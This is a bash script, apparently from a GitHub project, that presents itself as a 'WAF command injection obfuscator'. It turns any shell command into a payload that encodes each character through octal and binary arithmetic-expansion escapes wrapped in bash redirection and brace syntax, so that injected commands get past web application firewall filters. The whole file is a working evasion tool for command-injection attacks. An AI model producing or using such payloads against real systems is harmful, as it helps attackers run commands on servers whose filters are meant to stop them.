#!/usr/bin/env bash

# strict mode: fail fast on errors, unset vars or pipeline failures
set -euo pipefail

echo -e "
\x1b[1;37;44mWAF COMMAND INJECTION OBFUSCATOR\x1b[0m\n
\x1b[32mASCII\x1b[0m --> \x1b[33mOctal\x1b[0m --> \x1b[34mBinário\x1b[0m (obase2)\n
Made by rodricbr @ Github.com\n"

[[ -z "$*" ]]&& echo -e "Error: empty or null parameter!\nUsage: ${0##*/} \"shell command here\"" && exit 1;

STRINGS_="$*"

encode_byte() {
  local ch=$1
  local dec=$(printf '%d' "'$ch")
  local oct=$(printf '%o' "$dec")
  local bin=$(printf '%08d' "$(bc <<< "obase=2;$oct")")
  printf '\\\\$(($((1<<1))#%s))' "$bin"
}

encode_word() {
  local word=$1
  local result=""
  local i
  for (( i=0; i<${#word}; i++ )); do
    result+=$(encode_byte "${word:i:1}")
  done
  printf '%s' "$result"
}

main() {
  IFS=' ' read -ra words <<< "$STRINGS_"
    
  local payload=""
  local i
    
  if (( ${#words[@]} == 1 )); then
    # single word without curly braces
    payload="\${!##-}<<<\$\\'"
    payload+=$(encode_word "${words[0]}")
    payload+="\\'"
  else
    # spaced command with curly braces and commas
    payload="\${!##-}<<<{\\\$\\'"
    for (( i=0; i<${#words[@]}; i++ )); do
      if (( i > 0 )); then
        payload+="\\',\\\$\\'"
      fi
      payload+=$(encode_word "${words[i]}")
    done
    payload+="\\'}"
  fi
    
  printf '%s\n' "$payload"
}

main
